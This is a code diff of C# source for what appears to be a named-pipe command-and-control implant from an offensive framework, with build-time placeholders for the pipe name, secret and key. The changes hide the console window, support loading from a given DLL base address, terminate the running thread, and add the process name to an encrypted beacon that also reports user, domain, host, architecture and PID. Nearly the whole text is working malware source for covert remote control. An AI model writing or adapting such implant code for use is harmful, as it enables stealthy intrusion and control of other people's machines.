@@ -15,22 +15,35 @@ using System.Security.Principal;
 
 public class Program
 {
-	public static string command;
-	public static bool kill;
-	public static string pipeName;
-	public static string encryption;
-	public static string secret;
-	public static string output;
-	public static bool running;
+    public static string command;
+    public static bool kill;
+    public static string pipeName;
+    public static string encryption;
+    public static string secret;
+    public static string output;
+    public static bool running;
+    public const int SW_HIDEN = 0;
+    public const int SW_SHOW = 5;
+    public static IntPtr DllBaseAddress = IntPtr.Zero;
     private static StringWriter backgroundTaskOutput = new StringWriter();
+    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
+    [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-	public static void Sharp()
-	{
-		Program.pipeName = "#REPLACEPBINDPIPENAME#";
-		Program.secret = "#REPLACEPBINDSECRET#";
+    public static void Sharp(long baseAddr=0)
+    {
+        DllBaseAddress = new IntPtr(baseAddr);
+        ShowWindow(GetConsoleWindow(), SW_HIDEN);
+    	Program.pipeName = "#REPLACEPBINDPIPENAME#";
+    	Program.secret = "#REPLACEPBINDSECRET#";
 		Program.encryption = "#REPLACEKEY#";
 		Program.kill = false;
 		PbindConnect();
+        var x = GetCurrentThread();
+        TerminateThread(x, 0);
+
 	}
 
 	public static void Main()
@@ -89,8 +102,10 @@ public class Program
                         var cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
                         var arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                         int pid = Process.GetCurrentProcess().Id;
+                        var procname = Process.GetCurrentProcess().ProcessName;
                         Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-                        var o = String.Format("PBind-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
+                        var o = String.Format("PBind-Connected: {0};{1};{2};{3};{4};{5}", dn, u, cn, arch, pid, procname);
+                        
                         var zo = Encrypt(encryption, o);
                         pipeWriter.WriteLine(zo);
                         var exitvt = new ManualResetEvent(false);
@@ -193,8 +208,6 @@ public class Program
             Console.WriteLine(e.StackTrace);
         }
     }
-
-    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
 
     private static string[] ParseCommandLineArgs(string cl)
     {
